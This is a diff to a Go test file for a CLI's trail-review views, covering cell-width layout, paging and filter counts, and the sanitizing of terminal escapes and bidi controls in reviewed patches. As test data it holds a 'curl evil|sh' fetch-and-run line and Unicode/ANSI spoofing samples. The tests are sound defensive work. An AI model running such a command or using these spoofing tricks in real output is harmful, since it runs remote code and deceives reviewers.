@@ -6,6 +6,7 @@ import (
 	"testing"
 	"time"
 
+	"charm.land/lipgloss/v2"
 	"github.com/entireio/cli/cmd/entire/cli/api"
 	"github.com/entireio/cli/cmd/entire/cli/tuiutil"
 )
@@ -284,7 +285,7 @@ func TestRenderTrailReviewDashboardStyled_WrapsSummaryToTwoLinesWithAge(t *testi
 		if strings.HasPrefix(line, " ◆ The retry loop") {
 			first = i
 		}
-		if w := len([]rune(line)); w > width {
+		if w := lipgloss.Width(line); w > width {
 			t.Fatalf("line wider than %d: %q", width, line)
 		}
 	}
@@ -328,14 +329,20 @@ func TestRenderTrailReviewDashboardStyled_AnnouncesOpenFindingsHiddenByFilters(t
 	}
 }
 
-func TestRenderTrailReviewDashboardStyled_PagedCountUsesSummaryTotal(t *testing.T) {
+// The totals line gives the trail-wide counts; a paged section counts only
+// what it shows, since the open total ignores --severity and --freshness.
+func TestRenderTrailReviewDashboardStyled_PagedCountsOnlyShownFindings(t *testing.T) {
 	t.Parallel()
 	_, comments := trailReviewRenderFixture()
 	counts := countTrailReviewComments(comments)
 	counts.Open = 37
 	text := renderStyledDashboard(t, 100, comments[:2], "next-1", defaultTrailReviewListOptions(), counts)
+	if strings.Contains(text, "of 37") {
+		t.Fatalf("a paged section must not compare against the unfiltered open total:\n%s", text)
+	}
 	for _, want := range []string{
-		"── Needs attention (2 shown of 37 open) ",
+		"  37 open (",
+		"── Needs attention (2 shown) ",
 		`sorted within this page only. Next page: --cursor "next-1"`,
 	} {
 		if !strings.Contains(text, want) {
@@ -489,10 +496,45 @@ func TestRenderTrailReviewStyled_StripsTerminalEscapes(t *testing.T) {
 		t.Fatal(err)
 	}
 	renderTrailReviewCommentDetailStyled(&out, s, 100, detail)
-	renderTrailReviewCommentCreatedStyled(&out, s, target, comments[0])
+	renderTrailReviewCommentCreatedStyled(&out, s, 100, target, comments[0])
 	for _, bad := range []string{"\x1b]", "\x07", "\x1b[2J", "\x1b[5m"} {
 		if strings.Contains(out.String(), bad) {
 			t.Fatalf("styled output passed through %q", bad)
+		}
+	}
+}
+
+// A width-bound view measures display cells: CJK runes take two each, and
+// long titles and unknown severities must not push a line past the layout.
+func TestRenderTrailReviewStyled_FitsWidthInDisplayCells(t *testing.T) {
+	t.Parallel()
+	const width = 60
+	target, comments := trailReviewRenderFixture()
+	target.Trail.Title = strings.Repeat("刷新令牌", 20)
+	odd := strings.Repeat("unclassified", 10)
+	comments[0].Severity = &odd
+	comments[1].Body = trailReviewStrPtr(strings.Repeat("重试循环从不退避。", 20))
+	detail := trailReviewDetailFixture()
+	detail.Title = trailReviewStrPtr(strings.Repeat("过期偏差被忽略", 20))
+	detail.Severity = &odd
+
+	var out strings.Builder
+	s := colorTrailReviewStyles()
+	if err := renderTrailReviewDashboardStyled(&out, s, width, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
+		t.Fatal(err)
+	}
+	renderTrailReviewCommentsStyled(&out, s, width, comments, "")
+	renderTrailReviewCommentDetailStyled(&out, s, width, detail)
+	renderTrailReviewCommentCreatedStyled(&out, s, width, target, comments[0])
+	text := tuiutil.StripANSI(out.String())
+	for line := range strings.SplitSeq(text, "\n") {
+		if w := lipgloss.Width(line); w > width {
+			t.Fatalf("line is %d cells, wider than %d: %q\n%s", w, width, line, text)
+		}
+	}
+	for _, want := range []string{"● Trail #42  刷新令牌", "  过期偏差被忽略", "unclassified"} {
+		if !strings.Contains(text, want) {
+			t.Fatalf("styled output missing %q:\n%s", want, text)
 		}
 	}
 }
@@ -538,8 +580,9 @@ func TestRenderTrailReviewDashboardStyled_ShowsProjectAgents(t *testing.T) {
 func TestTrailReviewPatchTextKeepsPatchBytes(t *testing.T) {
 	t.Parallel()
 	patch := "\n-a\u00a0b\r\n+a\u3000b\x1b[2J\u202e\r\n\n"
-	if got, want := trailReviewPatchText(&patch), "-a\u00a0b\r\n+a\u3000b"; got != want {
-		t.Fatalf("trailReviewPatchText = %q, want %q", got, want)
+	got, altered := trailReviewPatchText(&patch)
+	if want := "-a\u00a0b\r\n+a\u3000b"; got != want || !altered {
+		t.Fatalf("trailReviewPatchText = %q, %v; want %q, true", got, altered, want)
 	}
 }
 
@@ -548,8 +591,9 @@ func TestTrailReviewPatchTextKeepsPatchBytes(t *testing.T) {
 func TestTrailReviewPatchTextShowsLoneCarriageReturn(t *testing.T) {
 	t.Parallel()
 	patch := "+curl evil|sh\r+// harmless\r\n"
-	if got, want := trailReviewPatchText(&patch), "+curl evil|sh^M+// harmless"; got != want {
-		t.Fatalf("trailReviewPatchText = %q, want %q", got, want)
+	got, altered := trailReviewPatchText(&patch)
+	if want := "+curl evil|sh^M+// harmless"; got != want || !altered {
+		t.Fatalf("trailReviewPatchText = %q, %v; want %q, true", got, altered, want)
 	}
 }
 
@@ -563,10 +607,145 @@ func TestRenderTrailReviewDashboardStyled_LastPageIsStillPaged(t *testing.T) {
 	opts := defaultTrailReviewListOptions()
 	opts.Cursor = "page-3"
 	text := renderStyledDashboard(t, 100, comments[:2], "", opts, counts)
-	if !strings.Contains(text, "── Needs attention (2 shown of 37 open) ") {
+	if !strings.Contains(text, "── Needs attention (2 shown) ") {
 		t.Fatalf("last page should say it is partial:\n%s", text)
 	}
 	if strings.Contains(text, "not shown by the current filters") {
 		t.Fatalf("a later page must not claim findings are filtered out:\n%s", text)
 	}
+}
+
+// With --cursor and no explicit --status, the server keeps the cursor's
+// original filters while opts.Status is only the local default, so the
+// dashboard renders what the page returned without assuming a status filter.
+func TestRenderTrailReviewDashboardStyled_CursorWithoutStatusRendersReturnedFindings(t *testing.T) {
+	t.Parallel()
+	_, comments := trailReviewRenderFixture()
+	opts := defaultTrailReviewListOptions()
+	opts.Cursor = "page-2"
+	counts := countTrailReviewComments(comments)
+
+	text := renderStyledDashboard(t, 100, comments[2:], "", opts, counts)
+	for _, bad := range []string{"Needs attention", "No open findings match", "not shown by the current filters"} {
+		if strings.Contains(text, bad) {
+			t.Fatalf("a page of done findings must not render %q:\n%s", bad, text)
+		}
+	}
+	if !strings.Contains(text, "── Done (2) ") {
+		t.Fatalf("returned findings missing:\n%s", text)
+	}
+
+	text = renderStyledDashboard(t, 100, nil, "", opts, counts)
+	if !strings.Contains(text, "  No findings found.\n") || strings.Contains(text, "No open findings match") {
+		t.Fatalf("an empty cursor page should say only that nothing came back:\n%s", text)
+	}
+}
+
+// An explicit --status reaches the server with the cursor, so the open
+// section is still known to be filtered.
+func TestRenderTrailReviewDashboardStyled_CursorWithExplicitStatusKeepsOpenSection(t *testing.T) {
+	t.Parallel()
+	opts := defaultTrailReviewListOptions()
+	opts.Cursor = "page-2"
+	opts.StatusChanged = true
+	text := renderStyledDashboard(t, 100, nil, "", opts, trailReviewCommentCounts{Open: 3})
+	for _, want := range []string{"── Needs attention (0 shown) ", "No open findings match the current filters."} {
+		if !strings.Contains(text, want) {
+			t.Fatalf("styled dashboard missing %q:\n%s", want, text)
+		}
+	}
+	if strings.Contains(text, "not shown by the current filters") {
+		t.Fatalf("a paged view must not blame the filters:\n%s", text)
+	}
+}
+
+// Bidi controls are format runes, not control runes, so the display
+// sanitizer keeps them; they could visually reorder a line in either view.
+func TestRenderTrailReview_StripsBidiControls(t *testing.T) {
+	t.Parallel()
+	target, comments := trailReviewRenderFixture()
+	target.Trail.Title = "Add \u202etoken refresh"
+	path := "src/\u202ests.noisses/auth.ts"
+	comments[0].Location = api.TrailReviewLocation{Granularity: "line", FilePath: &path}
+	detail := trailReviewDetailFixture()
+	detail.Location = comments[0].Location
+	detail.Title = trailReviewStrPtr("Expiry \u2066skew\u2069 ignored")
+
+	var plain strings.Builder
+	if err := printTrailReviewDashboard(&plain, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
+		t.Fatal(err)
+	}
+	printTrailReviewComments(&plain, comments, "")
+	printTrailReviewCommentDetail(&plain, detail)
+	printTrailReviewCommentCreated(&plain, target, comments[0])
+
+	var styled strings.Builder
+	s := colorTrailReviewStyles()
+	if err := renderTrailReviewDashboardStyled(&styled, s, 100, target, comments, "", anyStatusOptions(), countTrailReviewComments(comments), nil); err != nil {
+		t.Fatal(err)
+	}
+	renderTrailReviewCommentsStyled(&styled, s, 100, comments, "")
+	renderTrailReviewCommentDetailStyled(&styled, s, 100, detail)
+	renderTrailReviewCommentCreatedStyled(&styled, s, 100, target, comments[0])
+
+	for name, out := range map[string]string{"plain": plain.String(), "styled": tuiutil.StripANSI(styled.String())} {
+		if strings.ContainsAny(out, "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069") {
+			t.Fatalf("%s output kept a bidi control:\n%q", name, out)
+		}
+		for _, want := range []string{"Add token refresh", "src/sts.noisses/auth.ts", "Expiry skew ignored"} {
+			if !strings.Contains(out, want) {
+				t.Fatalf("%s output missing %q:\n%s", name, want, out)
+			}
+		}
+	}
+}
+
+// A patch that display sanitizing changed is not the exact patch; both views
+// say so and point at the exact bytes, and only then.
+func TestRenderTrailReview_NotesAlteredPatch(t *testing.T) {
+	t.Parallel()
+	const note = "this patch has characters not shown here"
+	render := func(detail api.TrailReviewComment) (string, string) {
+		var plain, styled strings.Builder
+		printTrailReviewCommentDetail(&plain, detail)
+		renderTrailReviewCommentDetailStyled(&styled, colorTrailReviewStyles(), 120, detail)
+		return plain.String(), tuiutil.StripANSI(styled.String())
+	}
+
+	plain, styled := render(trailReviewDetailFixture())
+	if strings.Contains(plain, note) || strings.Contains(styled, note) {
+		t.Fatalf("an intact patch must not carry the note:\nplain:\n%s\nstyled:\n%s", plain, styled)
+	}
+
+	for _, patch := range []string{"+a\u202eb\n", "+a\x1b[31mb\n", "+a\rb\n"} {
+		altered := trailReviewDetailFixture()
+		altered.SuggestedChanges[0].Patch = trailReviewStrPtr(patch)
+		plain, styled := render(altered)
+		for name, out := range map[string]string{"plain": plain, "styled": styled} {
+			for _, want := range []string{note, "\n    entire trail finding show 01M63Q23WNMWAAAAAAAAAAAAAA --json\n"} {
+				if !strings.Contains(out, want) {
+					t.Fatalf("%s view of patch %q missing %q:\n%s", name, patch, want, out)
+				}
+			}
+		}
+	}
+}
+
+// Before sanitizing, plain `finding show` printed a non-empty body trimmed,
+// even one of only whitespace; that output must not change.
+func TestPrintTrailReviewCommentDetail_WhitespaceBodyPlainGolden(t *testing.T) {
+	t.Parallel()
+	_, comments := trailReviewRenderFixture()
+	comment := comments[2]
+	comment.Body = trailReviewStrPtr("   ")
+	var out strings.Builder
+	printTrailReviewCommentDetail(&out, comment)
+	assertTrailReviewGolden(t, out.String(), `Finding:   01M63Q20JXB9CCCCCCCCCCCCCC
+Status:    resolved
+Freshness: current
+Severity:  low
+Location: whole_change
+
+
+`)
 }
